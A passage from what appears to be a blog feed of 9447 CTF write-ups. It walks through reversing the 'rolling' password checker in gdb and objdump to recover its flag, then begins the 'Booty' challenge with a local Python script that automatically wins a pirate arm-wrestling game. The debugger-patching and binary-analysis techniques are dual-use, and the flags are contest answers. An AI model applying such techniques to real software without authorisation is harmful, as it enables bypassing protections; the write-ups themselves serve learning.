<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span><span class="nb">set </span>environment <span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc-2.19.so ./ld-2.19.so
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>Fynd i mewn i cyfrinair
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>&lt;snip&gt;
</span></code></pre></td></tr></table></div></figure>


<p>The program would still segfault, but at least it ran. Okay, let&rsquo;s get to work. The strange string meant nothing to me, but it&rsquo;s Welsh for &ldquo;Enter a password&rdquo;. Of course, the description on 9447 mentioned that the binary would take an input. The flag is the input which the binary accepts. I ran the binary with an argument, which resulted in another Welsh string. <code>strings</code> identified the last Welsh string. I looked up their meaning via Google Translate and their address in <code>gdb</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Nac oes. Ceisiwch eto. <span class="o">==</span> No. Try again. // rolling : 0x600865 <span class="o">(</span><span class="s2">&quot;Nac oes. Ceisiwch eto.&quot;</span><span class="o">)</span>
</span><span class='line'><span class="nv">Llongyfarchiadau</span> <span class="o">==</span> Congratulations // rolling : 0x600854 <span class="o">(</span><span class="s2">&quot;Llongyfarchiadau&quot;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>These strings look like the &ldquo;Good&rdquo;/&ldquo;Bad&rdquo; output that we expect for this input-checking binary! Switching over to the output of <code>objdump</code>, I looked up where these strings are referenced:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>  400771:    <span class="m">48</span> 8b <span class="m">55</span> f0           mov    -0x10<span class="o">(</span>%rbp<span class="o">)</span>,%rdx
</span><span class='line'>  400775: <span class="m">48</span> <span class="m">83</span> c2 <span class="m">08</span>            add    <span class="nv">$0x8</span>,%rdx
</span><span class='line'>  400779: <span class="m">48</span> 8b <span class="m">12</span>              mov    <span class="o">(</span>%rdx<span class="o">)</span>,%rdx
</span><span class='line'>  40077c: <span class="m">48</span> <span class="m">89</span> d7              mov    %rdx,%rdi
</span><span class='line'>  40077f: ff d0                   callq  *%rax        <span class="c"># interesting function</span>
</span><span class='line'>  400781: <span class="m">85</span> c0                    <span class="nb">test</span>   %eax,%eax    <span class="c"># if eax == 1 -&gt; success</span>
</span><span class='line'>  400783: <span class="m">74</span> 0c                    je     <span class="m">400791</span> &lt;memcpy@plt+0x2b1&gt;
</span><span class='line'>  400785: bf <span class="m">54</span> <span class="m">08</span> <span class="m">40</span> <span class="m">00</span>          mov    <span class="nv">$0x400854</span>,%edi               <span class="c"># Llong...</span>
</span><span class='line'>  40078a: e8 <span class="m">11</span> fd ff ff           callq  4004a0 &lt;puts@plt&gt;
</span><span class='line'>  40078f: eb <span class="m">16</span>                    jmp    4007a7 &lt;memcpy@plt+0x2c7&gt;
</span><span class='line'>  400791: bf <span class="m">65</span> <span class="m">08</span> <span class="m">40</span> <span class="m">00</span>          mov    <span class="nv">$0x400865</span>,%edi               <span class="c"># Nac oes... </span>
</span><span class='line'>  400796: e8 <span class="m">05</span> fd ff ff           callq  4004a0 &lt;puts@plt&gt;
</span><span class='line'>  40079b: eb 0a                   jmp    4007a7 &lt;memcpy@plt+0x2c7&gt;
</span><span class='line'>  40079d: bf 7c <span class="m">08</span> <span class="m">40</span> <span class="m">00</span>         mov    <span class="nv">$0x40087c</span>,%edi
</span><span class='line'>  4007a2: e8 f9 <span class="nb">fc </span>ff ff          callq  4004a0 &lt;puts@plt&gt;
</span><span class='line'>  4007a7: b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
</span><span class='line'>  4007ac: c9                      leaveq
</span><span class='line'>  4007ad: c3                      retq
</span></code></pre></td></tr></table></div></figure>


<p>The <code>test eax, eax</code> at <code>0x400781</code> controls which path is taken: either OK (&ldquo;Llong&hellip;&rdquo;) or not OK (&ldquo;Nac oes&hellip;&rdquo;). The value of <code>eax</code> is probably set by the function that is called at <code>0x40077f: callq  *%rax</code>. Switching back to <code>gdb</code>, I set a breakpoint on <code>0x40077f</code> and prepared to trace that function.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>b *0x40077f
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x40077f
</span><span class='line'>gdb-peda<span class="nv">$ </span>r bleh
</span><span class='line'>...
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x400775:  add    rdx,0x8
</span><span class='line'>   0x400779:  mov    rdx,QWORD PTR <span class="o">[</span>rdx<span class="o">]</span>
</span><span class='line'>   0x40077c:  mov    rdi,rdx
</span><span class='line'><span class="o">=</span>&gt; 0x40077f:    call   rax
</span><span class='line'>   0x400781:  <span class="nb">test   </span>eax,eax
</span><span class='line'>   0x400783:  je     0x400791
</span><span class='line'>...
</span><span class='line'>Breakpoint 1, 0x000000000040077f in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The binary was halted at the <code>call eax</code> instruction. I entered <code>ni</code> to step into the function. This is where the fun really starts, it is where our string is checked for validity. There&rsquo;s a red herring in there too. The function starts like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/40i <span class="nv">$rip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x7ffff7ff5000:  push   rbp
</span><span class='line'>   0x7ffff7ff5001:    mov    rbp,rsp
</span><span class='line'>   0x7ffff7ff5004:    sub    rsp,0x10
</span><span class='line'>   0x7ffff7ff5008:    mov    QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>,rdi
</span><span class='line'>   0x7ffff7ff500c:    mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
</span><span class='line'>   <span class="c"># grab first byte of input</span>
</span><span class='line'>   0x7ffff7ff5010:    movzx  eax,BYTE PTR <span class="o">[</span>rax<span class="o">]</span> 
</span><span class='line'>   <span class="c"># is it &#39;9&#39;?</span>
</span><span class='line'>   0x7ffff7ff5013:    cmp    al,0x39
</span><span class='line'>   <span class="c"># if so, jump away</span>
</span><span class='line'>   0x7ffff7ff5015:    je     0x7ffff7ff5143   
</span><span class='line'>   <span class="c"># else:</span>
</span><span class='line'>   0x7ffff7ff501b:    mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
</span><span class='line'>   <span class="c"># grab first byte of input</span>
</span><span class='line'>   0x7ffff7ff501f:    movzx  eax,BYTE PTR <span class="o">[</span>rax<span class="o">]</span> 
</span><span class='line'>   <span class="c"># is it &#39;f&#39;?</span>
</span><span class='line'>   0x7ffff7ff5022:    cmp    al,0x66          
</span><span class='line'>   <span class="c"># if not, jump away</span>
</span><span class='line'>   0x7ffff7ff5024:    jne    0x7ffff7ff5139   
</span><span class='line'>   0x7ffff7ff502a:    mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
</span><span class='line'>   <span class="c"># second byte of input</span>
</span><span class='line'>   0x7ffff7ff502e:    add    rax,0x1      
</span><span class='line'>   0x7ffff7ff5032:    movzx  eax,BYTE PTR <span class="o">[</span>rax<span class="o">]</span>
</span><span class='line'>   <span class="c"># is it &#39;l&#39;?</span>
</span><span class='line'>   0x7ffff7ff5035:    cmp    al,0x6c  
</span><span class='line'>   0x7ffff7ff5037:    jne    0x7ffff7ff5139
</span><span class='line'>   0x7ffff7ff503d:    mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
</span><span class='line'>   <span class="c"># third byte of input</span>
</span><span class='line'>   0x7ffff7ff5041:    add    rax,0x2
</span><span class='line'>   0x7ffff7ff5045:    movzx  eax,BYTE PTR <span class="o">[</span>rax<span class="o">]</span>
</span><span class='line'>   <span class="c"># is it &#39;a&#39;?</span>
</span><span class='line'>   0x7ffff7ff5048:    cmp    al,0x61
</span></code></pre></td></tr></table></div></figure>


<p>I was all super excited and started to trace the path that started spelling out <code>flag</code>, each time adjusting <code>al</code> to the value that it was being compared to (in <code>gdb</code>, this can be done by executing <code>set $al=0x66</code>). However, this path spelled out <code>flagstartswith9</code>. In other words, I fell for the red herring. D&#8217;oh! The other code path started comparing the input to <code>9</code>, so I restarted the binary and entered <code>9447</code> as the input. Re-tracing the check-input function, I noticed that the code had changed!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Input &#39;bleh&#39;:</span>
</span><span class='line'>   0x7ffff7ff5022:    cmp    al,0x66  
</span><span class='line'><span class="c"># Input &#39;9447&#39;</span>
</span><span class='line'>   0x7ffff7ff5022:    cmp    al,0x34
</span></code></pre></td></tr></table></div></figure>


<p>Very fancy. I traced the function further, ending up here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>RAX: 0x72 <span class="o">(</span><span class="s1">&#39;r&#39;</span><span class="o">)</span>
</span><span class='line'>...
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x7ffff7ff5062:    movzx  eax,BYTE PTR <span class="o">[</span>rax<span class="o">]</span>
</span><span class='line'>   0x7ffff7ff5065:    movsx  eax,al
</span><span class='line'>   0x7ffff7ff5068:    add    eax,0x39
</span><span class='line'><span class="o">=</span>&gt; 0x7ffff7ff506b:  cmp    edx,eax
</span></code></pre></td></tr></table></div></figure>


<p>This is the fifth character of the password and seems to be <code>r</code>. I did a quick <code>set $edx=$eax</code> and moved on. The next bytes were <code>oll</code>, so I expected the following check to be for <code>i</code>. However, the password function borked, because it was using the first four characters to generate the next four! I had only entered four in total. The name of the binary, <code>rolling</code>, makes a bit more sense now :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># grab eight input byte</span>
</span><span class='line'>   0x7ffff7ff50c1:    mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
</span><span class='line'>   0x7ffff7ff50c5:    add    rax,0x7
</span><span class='line'>   0x7ffff7ff50c9:    movzx  eax,BYTE PTR <span class="o">[</span>rax<span class="o">]</span>
</span><span class='line'><span class="o">=</span>&gt; 0x7ffff7ff50cc:  movsx  eax,al
</span><span class='line'><span class="c"># grab third input byte...</span>
</span><span class='line'>   0x7ffff7ff50cf:    mov    rdx,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
</span><span class='line'>   0x7ffff7ff50d3:    add    rdx,0x3
</span><span class='line'>   0x7ffff7ff50d7:    movzx  edx,BYTE PTR <span class="o">[</span>rdx<span class="o">]</span>
</span><span class='line'>   0x7ffff7ff50da:    movsx  edx,dl
</span><span class='line'><span class="c"># ... and add 0x35 to that third byte!</span>
</span><span class='line'>   0x7ffff7ff50dd:    add    edx,0x35
</span><span class='line'><span class="c"># compare [3]+0x35 to [7]:</span>
</span><span class='line'>   0x7ffff7ff50e0:    cmp    eax,edx
</span></code></pre></td></tr></table></div></figure>


<p>This meant I just had to re-run the binary once I had four more characters. No problem! Eventually, at each <code>cmp</code> execution, I noted the proper byte and the correct input turned out to be <code>9447rollingisfun</code>.</p>

<p>The flag was <code>9447{9447rollingisfun}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[9447 CTF: Booty]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/01/9447-ctf-booty/"/>
    <updated>2014-12-01T20:13:31+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/01/9447-ctf-booty</id>
    <content type="html"><![CDATA[<p>9447 CTF was ran the other day, and while I didn&rsquo;t have a lot of time, I managed to snatch a couple of flags. First one was this pirate-themed Binary Exploitation.</p>

<!--more-->


<p>The binary present some kind of text-based arm-wrestling game. You can enter your name and then you have to fight several opponents. With no obvious buffer overflow / format string vulnerability (<code>%</code> characters are filtered and set to NULL) in sight, I focused on building a script that would win the game for me. After this, it was possible to change the name, and I was hoping a vulnerability would be present there.</p>

<p>The game is quite easy to beat: the next move of the opponent can be predicted from the message the game sends you. So if the output contained &ldquo;is looking exhausted&rdquo;, the next move should be to &ldquo;[p]ush&rdquo;. I whipped up some quick python to do this and which gives command back to the user when it detects that the game is finished. The binary itself was ran with <code>socat</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/9447<span class="nv">$ </span>socat TCP-LISTEN:7778,fork EXEC:./booty
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">7778</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># wait before continuing, allows attaching with gdb.</span>
</span><span class='line'><span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive banner</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send name</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span><span class="s">&quot;barrebas&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cmd</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># try to beat the game</span>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>  <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="n">data</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># proper responses</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;LEVEL&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;h</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;exhausted&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;p</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;flex&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;h</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;tense&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;r</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>      
</span><span class='line'>  <span class="c"># we&#39;ve won; hand over control</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;again&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>      <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>      <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>      
</span><span class='line'>  <span class="c"># game expects input, so send it</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&quot;&gt;&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">cmd</span><span class="p">:</span>
</span><span class='line'>          <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>          <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This allows us to win the game and gives us a &ldquo;clue&rdquo; as to where the treasure (flag) is. Furthermore, we can enter a new user name, but again, no obvious vulnerabilities. et0x noticed that once you send a shorter username, part of the previous username shows up. This can be seen below, as the new user name is not <code>KING</code> but <code>KINGebas</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>:: YOU WIN :: YE NOT BE WALKING THE PLANK YET!
</span><span class='line'>
</span><span class='line'>                      .ed<span class="s2">&quot;&quot;&quot;&quot;</span> <span class="s2">&quot;&quot;&quot;$$$$be.</span>
</span><span class='line'><span class="s2">                    -&quot;</span>           ^<span class="s2">&quot;&quot;</span>**<span class="nv">$$$e</span>.
</span><span class='line'>                  .<span class="s2">&quot;                   &#39;$$$c</span>
</span><span class='line'><span class="s2">                 /                      &quot;</span>4<span class="nv">$$</span>b
</span><span class='line'>                d  <span class="m">3</span>                     <span class="nv">$$$$</span>
</span><span class='line'>                <span class="nv">$ </span> *                   .<span class="nv">$$$$$$</span>
</span><span class='line'>               .<span class="nv">$ </span> ^c           <span class="nv">$$$$$e$$$$$$$$</span>.
</span><span class='line'>               d<span class="nv">$L</span>  4.         4<span class="nv">$$$$$$$$$$$$$$</span>b
</span><span class='line'>               <span class="nv">$$$$</span>b ^ceeeee.  4<span class="nv">$$</span>ECL.F*<span class="nv">$$$$$$</span><span class="err">$</span>
</span><span class='line'>   e<span class="s2">$&quot;&quot;</span><span class="o">=</span>.      <span class="nv">$$$$</span>P d<span class="nv">$$$$</span>F <span class="nv">$ $$$$$$$$$-</span> <span class="nv">$$$$$$</span>
</span><span class='line'>  z<span class="nv">$$</span>b. ^c     3<span class="nv">$$$F</span> <span class="s2">&quot;$$$$b   $&quot;</span><span class="nv">$$$$$$$ </span> <span class="nv">$$$$</span>*<span class="s2">&quot;      .=&quot;&quot;$c</span>
</span><span class='line'><span class="s2"> 4$$$$L   \     $$P&quot;</span>  <span class="s2">&quot;$$b   .$ $$$$$...e$$        .=  e$$$.</span>
</span><span class='line'><span class="s2"> ^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$</span>
</span><span class='line'><span class="s2">   &quot;</span>**<span class="nv">$$$ec</span>   <span class="s2">&quot;\   %ce&quot;&quot;    $$$  $$$$$$$$$$*    .r&quot;</span> <span class="o">=</span><span class="nv">$$$$</span>P<span class="s2">&quot;&quot;</span>
</span><span class='line'>         <span class="s2">&quot;*$b.  &quot;</span>c  *<span class="nv">$e</span>.    *** d<span class="nv">$$$$</span><span class="s2">$&quot;L$$    .d&quot;</span>  e<span class="nv">$$</span>***<span class="s2">&quot;</span>
</span><span class='line'><span class="s2">         ^*$$c ^$c $$$      4J$$$$$% $$$ .e*&quot;</span>.eeP<span class="s2">&quot;</span>
</span><span class='line'><span class="s2">              &quot;</span><span class="nv">$$$$$$</span><span class="s2">&quot;&#39;$=e....$*$$**$cz$$&quot;</span> <span class="s2">&quot;..d$*&quot;</span>
</span><span class='line'>                <span class="s2">&quot;*$$$  *=%4.$ L L$ P3$$$F $$$P&quot;</span>
</span><span class='line'>                   <span class="s2">&quot;$   &quot;</span>%*ebJLzb<span class="nv">$e$$$$$b</span> <span class="nv">$P</span><span class="s2">&quot;</span>
</span><span class='line'><span class="s2">                     %..      4$$$$$$$$$$ &quot;</span>
</span><span class='line'>                      <span class="nv">$$$e</span>   z<span class="nv">$$$$$$$$$$</span>%
</span><span class='line'>                       <span class="s2">&quot;*$c  &quot;</span><span class="nv">$$$$$$$P</span><span class="s2">&quot;</span>
</span><span class='line'><span class="s2">                        .&quot;&quot;&quot;</span>*<span class="nv">$$$$$$$$</span>bc
</span><span class='line'>                     .-<span class="s2">&quot;    .$***$$$&quot;&quot;&quot;</span>*e.
</span><span class='line'>                  .-<span class="s2">&quot;    .e$&quot;</span>     <span class="s2">&quot;*$c  ^*b.</span>
</span><span class='line'><span class="s2">           .=*&quot;&quot;&quot;&quot;    .e$*&quot;</span>          <span class="s2">&quot;*bc  &quot;</span>*<span class="nv">$e</span>..
</span><span class='line'>         .<span class="s2">$&quot;        .z*&quot;</span>               ^*<span class="nv">$e</span>.   <span class="s2">&quot;*****e.</span>
</span><span class='line'><span class="s2">         $$ee$c   .d&quot;</span>                     <span class="s2">&quot;*$.        3.</span>
</span><span class='line'><span class="s2">         ^*$E&quot;</span><span class="o">)</span><span class="nv">$.</span>.<span class="s2">$&quot;                         *   .ee==d%</span>
</span><span class='line'><span class="s2">            $.d$$$*                           *  J$$$e*</span>
</span><span class='line'><span class="s2">             &quot;&quot;&quot;&quot;&quot;</span>                             <span class="s2">&quot;$$$&quot;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>:: HAIL THE NEW PIRATE KING, barrebas
</span><span class='line'>
</span><span class='line'>0xffdd1c3f marks the spot of your treasure!
</span><span class='line'>
</span><span class='line'>Would ye like to play again? <span class="o">(</span>y / n<span class="o">)</span>:
</span><span class='line'>&gt;
</span><span class='line'>y
</span><span class='line'>PIRATE KING<span class="err">&#39;</span>s be entitled to change their name:
</span><span class='line'>&gt; &gt; KING
</span><span class='line'>
</span><span class='line'>STA:  62, STR: <span class="m">10</span> :: KINGebas
</span><span class='line'>STA: 104, STR: <span class="m">18</span> :: Vengeful Queen Anne
</span><span class='line'>
</span><span class='line'>Vengeful Queen Anne begins to flex their muscles.
</span><span class='line'>
</span><span class='line'>Choose an action, <span class="o">[</span>p<span class="o">]</span>ush  <span class="o">[</span>h<span class="o">]</span>old  <span class="o">[</span>r<span class="o">]</span>est:
</span></code></pre></td></tr></table></div></figure>


<p>I focused on the binary address, but as it turned out, the flag is not being read into the binary! I tried to break on <code>fopen</code>, and search the memory from within <code>gdb</code> for the flag that I planted locally&hellip; but nothing! Inspecting that memory address in <code>gdb</code> showed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
